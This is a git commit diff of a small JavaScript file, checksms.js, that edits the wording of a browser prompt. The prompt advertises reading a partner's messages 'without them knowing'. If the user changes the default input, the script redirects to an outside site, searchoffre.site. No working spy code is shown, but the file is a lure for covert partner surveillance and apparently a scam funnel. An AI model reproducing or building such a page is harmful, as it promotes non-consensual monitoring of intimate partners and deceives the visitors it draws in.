29e63da6cecda8b48e17a42116820f8d02ae8135
bigetijazz8 <bigetijazz8@gmail.com>
2024-11-10 19:41:44 -0800

    Update checksms.js

--- checksms.js
+++ checksms.js
@@ -1,6 +1,6 @@
 
 var password = 'START SPYING'
-password=prompt('SMS: Hello, this app allows you to check and read messages of your partner without them knowing, Kindly press Ok to proceed now','START SPYING');
+password=prompt('SMS: Hello, this service allows you to check and read messages of your partner without them knowing, Kindly press Ok to proceed now','START SPYING');
 if (password != 'START SPYING') {
 location.href='https://www.searchoffre.site/check-Messages';
 }
